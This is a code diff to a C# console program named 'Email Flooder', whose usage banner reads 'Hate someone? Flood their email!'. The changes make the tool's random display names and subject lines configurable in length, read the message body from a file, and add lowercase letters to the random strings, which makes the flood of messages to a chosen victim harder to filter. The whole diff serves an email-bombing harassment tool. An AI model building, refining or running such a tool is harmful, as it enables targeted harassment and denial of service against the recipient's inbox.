@@ -13,7 +13,7 @@ internal class Program
     {
         if (args.Length <= 1)
         {
-            Console.WriteLine("Email Flooder v1.0.2");
+            Console.WriteLine("Email Flooder v1.0.3");
             Console.WriteLine("Hate someone? Flood their email!\n");
             Console.WriteLine("Usage:\n");
             Console.WriteLine("EmailFlooder <email to send from> <email to send to>\n");
@@ -35,10 +35,10 @@ internal class Program
             fromPassword += key.KeyChar;
         }
         Random random = new Random();
-        var fromAddress = new MailAddress(args[0], RandomString(64, random));
-        var toAddress = new MailAddress(args[1], RandomString(64, random));
-        const string subject = "subject line";
-        const string body = "this is the body";
+        var fromAddress = new MailAddress(args[0], RandomString(Convert.ToInt32(args[2]), random));
+        var toAddress = new MailAddress(args[1], RandomString(Convert.ToInt32(args[2]), random));
+        string subject = RandomString(Convert.ToInt32(args[2]), random);
+        string body = File.ReadAllText(args[3]);
         var n = 0;
 
         var smtp = new SmtpClient
@@ -66,7 +66,7 @@ internal class Program
 
     private static string RandomString(int length, Random random)
     {
-        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
         return new string(Enumerable.Repeat(chars, length)
             .Select(s => s[random.Next(s.Length)]).ToArray());
     }
